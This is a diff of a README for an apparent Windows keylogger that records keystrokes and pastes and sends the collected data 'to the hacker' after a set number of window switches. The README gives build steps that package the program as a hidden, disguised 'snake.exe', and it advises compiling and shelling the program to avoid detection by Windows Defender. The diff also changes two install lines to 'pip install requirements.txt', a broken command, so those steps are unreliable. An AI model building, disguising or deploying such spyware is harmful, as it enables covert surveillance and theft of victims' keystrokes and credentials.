@@ -13,6 +13,7 @@
 - MS Windows (tested on 10)
 - Python 2.7
 
+
 **Modifiable parameters**  
 - `Packing_interval` 
   - How many the user does window switches are needed for the keylogger to compress all the information and send it to the hacker.  
@@ -24,7 +25,7 @@
 **Quick start**
 1. `git clone https://github.com/Zeal-L/Key-paste-screen-logger`
 2. `cd Key-paste-screen-logger`
-3. `pip install pyinstaller`
+3. `pip install requirements.txt`
 4. `pyinstaller -F -w -n snake -i Snake.ico system.py`
 5. `cd dist/ && ./snake.exe `
 
@@ -32,7 +33,7 @@
 - Use Cython to convert programs to C for faster execution and encryption.
 - It is also useful to shell the program to avoid being killed by Windows Defender Security Center.
 - You may need to install the corresponding Python version of Visual Studio to successfully convert py to pyd, otherwise it will report "Unable to find vcvarsall.bat" error
-1. `pip install Cython`
+1. `pip install requirements.txt`
 2. `python shell.py build_ext --inplace`
 3. `pyinstaller -F -w -n snake -i Snake.ico index.py`
 4. `cd dist/ && ./snake.exe `
